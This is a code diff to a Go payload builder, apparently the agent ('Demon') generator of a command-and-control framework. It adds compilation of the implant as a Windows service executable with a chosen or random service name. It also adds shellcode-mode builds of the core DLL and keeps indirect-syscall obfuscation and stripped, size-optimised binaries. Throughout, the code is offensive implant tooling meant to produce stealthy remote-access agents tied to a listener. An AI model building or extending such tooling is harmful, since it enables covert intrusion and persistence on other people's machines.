@@ -16,6 +16,7 @@ import (
 	"os"
 	"os/exec"
 	"path"
+	"path/filepath"
 	"strconv"
 	"strings"
 )
@@ -82,8 +83,10 @@ type Builder struct {
 		Defines     []string
 
 		Main struct {
-			Dll string
-			Exe string
+			Demon string
+			Dll   string
+			Exe   string
+			Svc   string
 		}
 	}
 
@@ -112,6 +115,7 @@ func NewBuilder(config BuilderConfig) *Builder {
 	}
 
 	builder.compilerOptions.CFlags = []string{
+		"",
 		"-Os -fno-asynchronous-unwind-tables -masm=intel",
 		"-fno-ident -fpack-struct=8 -falign-functions=1",
 		"-s -ffunction-sections -falign-jumps=1 -w",
@@ -119,8 +123,10 @@ func NewBuilder(config BuilderConfig) *Builder {
 		"-Wl,-s,--no-seh,--enable-stdcall-fixup",
 	}
 
-	builder.compilerOptions.Main.Exe = "Source/Main/MainExe.c"
+	builder.compilerOptions.Main.Demon = "Source/Main/Main.c"
 	builder.compilerOptions.Main.Dll = "Source/Main/MainDll.c"
+	builder.compilerOptions.Main.Exe = "Source/Main/MainExe.c"
+	builder.compilerOptions.Main.Svc = "Source/Main/MainSvc.c"
 
 	builder.compilerOptions.Config = config
 
@@ -172,7 +178,6 @@ func (b *Builder) Build() bool {
 		}
 	}
 	array += "}"
-
 	logger.Debug("array = " + array)
 
 	b.compilerOptions.Defines = append(b.compilerOptions.Defines, "CONFIG_BYTES="+array)
@@ -182,13 +187,38 @@ func (b *Builder) Build() bool {
 	if b.debugMode {
 		b.compilerOptions.Defines = append(b.compilerOptions.Defines, "DEBUG")
 	} else {
-		b.compilerOptions.CFlags[0] += " -nostdlib -mwindows"
+		if b.FileType == FILETYPE_WINDOWS_SERVICE_EXE {
+			b.compilerOptions.CFlags[0] = "-mwindows -ladvapi32"
+		} else {
+			b.compilerOptions.CFlags[0] += " -nostdlib -mwindows"
+		}
 	}
 
 	// add compiler
 	if b.config.Arch == ARCHITECTURE_X64 {
+		abs, err := filepath.Abs(b.compilerOptions.Config.Compiler64)
+
+		if err != nil {
+			if !b.silent {
+				b.SendConsoleMessage("Error", fmt.Sprintf("Failed to resolve x64 compiler path: %v", err))
+				return false
+			}
+		}
+
+		b.compilerOptions.Config.Compiler64 = abs
+
 		CompileCommand += b.compilerOptions.Config.Compiler64 + " "
 	} else {
+		abs, err := filepath.Abs(b.compilerOptions.Config.Compiler86)
+
+		if err != nil {
+			if !b.silent {
+				b.SendConsoleMessage("Error", fmt.Sprintf("Failed to resolve x86 compiler path: %v", err))
+				return false
+			}
+		}
+		b.compilerOptions.Config.Compiler86 = abs
+
 		CompileCommand += b.compilerOptions.Config.Compiler86 + " "
 	}
 
@@ -211,6 +241,7 @@ func (b *Builder) Build() bool {
 			}
 		}
 	}
+	CompileCommand += b.compilerOptions.Main.Demon + " "
 
 	// add include directories
 	for _, dir := range b.compilerOptions.IncludeDirs {
@@ -229,8 +260,14 @@ func (b *Builder) Build() bool {
 	switch b.FileType {
 	case FILETYPE_WINDOWS_EXE:
 		logger.Debug("Compile exe")
-		CompileCommand += "-e WinMain "
+		CompileCommand += "-D MAIN_THREADED -e WinMain "
 		CompileCommand += b.compilerOptions.Main.Exe + " "
+		break
+
+	case FILETYPE_WINDOWS_SERVICE_EXE:
+		logger.Debug("Compile Service exe")
+		CompileCommand += "-D MAIN_THREADED -D SVC_EXE -lntdll -e WinMain "
+		CompileCommand += b.compilerOptions.Main.Svc + " "
 		break
 
 	case FILETYPE_WINDOWS_DLL:
@@ -251,7 +288,7 @@ func (b *Builder) Build() bool {
 		DllPayload.SetFormat(FILETYPE_WINDOWS_DLL)
 		DllPayload.SetListener(b.config.ListenerType, b.config.ListenerConfig)
 		DllPayload.SetOutputPath("/tmp/" + utils.GenerateID(10) + ".dll")
-		// DllPayload.SetPatchConfig(t.Profile.Config.Demon.Binary.Header)
+		DllPayload.compilerOptions.Defines = append(DllPayload.compilerOptions.Defines, "SHELLCODE")
 
 		b.SendConsoleMessage("Info", "Compiling core dll...")
 		if DllPayload.Build() {
@@ -392,6 +429,24 @@ func (b *Builder) PatchConfig() []byte {
 			b.compilerOptions.Defines = append(b.compilerOptions.Defines, "OBF_SYSCALL")
 			if !b.silent {
 				b.SendConsoleMessage("Info", "Use indirect syscalls")
+			}
+		}
+	}
+
+	if b.FileType == FILETYPE_WINDOWS_SERVICE_EXE {
+		if val, ok := b.config.Config["Service Name"].(string); ok {
+			if len(val) > 0 {
+				b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SERVICE_NAME=\\\""+val+"\\\"")
+				if !b.silent {
+					b.SendConsoleMessage("Info", "Set service name to "+val)
+				}
+			} else {
+				val = common.RandomString(6)
+				b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SERVICE_NAME=\\\""+val+"\\\"")
+				if !b.silent {
+					b.SendConsoleMessage("Info", "Service name not specified... using random name")
+					b.SendConsoleMessage("Info", "Set service name to "+val)
+				}
 			}
 		}
 	}
